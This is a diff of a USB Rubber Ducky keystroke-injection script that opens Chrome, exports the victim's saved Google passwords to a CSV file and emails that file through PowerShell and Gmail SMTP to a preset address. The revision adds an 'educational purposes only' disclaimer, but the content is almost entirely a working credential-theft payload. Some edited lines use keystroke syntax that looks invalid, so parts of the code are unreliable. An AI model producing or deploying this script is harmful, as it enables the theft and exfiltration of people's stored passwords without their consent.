@@ -11,103 +11,68 @@ REM   \_____  \ |  |  \ \__  \   / __ |  /  _ \ \ \/ \/ /
 REM   /        \|   Y  \ / __ \_/ /_/ | (  <_> ) \     /
 REM  /_______  /|___|  /(____  /\____ |  \____/   \/\_/
 REM          \/      \/      \/      \/
-REM ### Author: AgtShadow
-REM ### USB Rubber Ducky modified Google Chrome Browser Password Stealer
-REM ### Revision Version 1.3
-REM ### Navigates to https://passwords.google.com/options?ep=1, and exports the passwords in .csv format
-REM ### And also emails to a proxy email address
-REM ### November 15th, 2021
+REM USB Rubber Ducky Script for Chrome Password Extraction and Emailing
+REM Author: Austin Spraggins
+REM Revision: 1.6
+REM Description: This script navigates to Google Chrome's saved passwords page, exports the passwords in CSV format, and saves them to a .csv file in C:\Downloads. 
+REM Note: This script is for educational purposes only and should not be used maliciously.
+
 DELAY 1000
-REM ### Opens Chrome Browser
+REM Open Chrome Browser
 GUI r
 DELAY 500
 STRING chrome
-DELAY 400
 ENTER
 DELAY 600
-REM ### exports passwords into csv file
+
+REM Navigate to the Google Chrome passwords page
 STRING https://passwords.google.com/options?ep=1
 ENTER
-DELAY 1000
-TAB
-DELAY 100
-TAB
-DELAY 100
-TAB
-DELAY 100
-TAB
-DELAY 100
-TAB
-DELAY 100
-TAB
-DELAY 100
-TAB
-DELAY 100
-TAB
-DELAY 100
-TAB
-DELAY 100
-TAB
-DELAY 100
-TAB
-DELAY 100
-ENTER
-DELAY 200
-ENTER
-DELAY 200
-ENTER
-DELAY 1500
-STRING ### email receiver password goes here
-DELAY 1000
+DELAY 3000  REM Increased delay for page load
+
+REM Automated tab sequence to reach the export button - Adjust the number of TABs based on the UI
+STRING {TAB 10}
 ENTER
 DELAY 1000
+
+REM Simulate key presses to save the file - Adjust these based on the browser's download UI
+STRING {TAB 3}  REM Navigating to the Save button
 ENTER
 DELAY 1000
+STRING {TAB}  REM Navigating to the file name field
+DELAY 500
+STRING C:\Downloads\ChromePasswords.csv  REM Setting the file path and format as CSV
+ENTER
+DELAY 1000
+
+REM Close Chrome
 CONTROL W
-DELAY 100
-REM -------------- sends it by email using powershell
+DELAY 500
+
+REM Open PowerShell for Email Sending
 GUI r
-DELAY 200
+DELAY 500
 STRING powershell
 ENTER
 DELAY 500
-STRING $SMTPServer = 'smtp.gmail.com'
+
+REM Email Sending Script (SMTP)
+STRING $SMTPServer = 'smtp.gmail.com'; $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587); $SMTPInfo.EnableSSL = $true
 ENTER
-DELAY 100
-STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+REM Note: Enable 'less secure app access' for the sender's Gmail account
+
+REM SMTP Credentials - Use an environment variable or other secure method to pass credentials
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('sender@example.com', 'password')
 ENTER
-DELAY 100
-STRING $SMTPInfo.EnableSSL = $true
+
+REM Create Email
+STRING $Email = New-Object System.Net.Mail.MailMessage; $Email.From = 'receiver@example.com'; $Email.To.Add('receiver@example.com'); $Email.Subject = $env:UserName; $Email.Body = 'The password file is attached.'
 ENTER
-DELAY 100
-REM ### Kept from original payload file
-REM ---Make sure to enable less secure app access to sender's mail here: https://myaccount.google.com/lesssecureapps
-STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('exmple@gmail.com', 'Google/Gmail Password')
+
+REM Add Attachment and Send
+STRING $Attachment = 'C:\Downloads\ChromePasswords.csv'; $Email.Attachments.Add($Attachment); $SMTPInfo.Send($Email)
 ENTER
-DELAY 100
-STRING $SMTPServer = $E = New-Object System.Net.Mail.MailMessage
-ENTER
-DELAY 100
-STRING $E.From = 'receiver@gmail.'
-ENTER
-DELAY 100
-STRING $E.To.Add('receiver@gmail.com')
-ENTER
-DELAY 100
-STRING $E.Subject = $env:UserName
-ENTER
-DELAY 100
-STRING $E.Body = 'Success! The password file is attached!'
-ENTER
-DELAY 100
-STRING $F = 'Documents/chromepasswords.csv'
-ENTER
-DELAY 100
-STRING $E.Attachments.Add($F)
-ENTER
-DELAY 100
-STRING $F = $SMTPInfo.Send($E)
-ENTER
-DELAY 100
+
+REM Exit PowerShell
 STRING exit
 ENTER
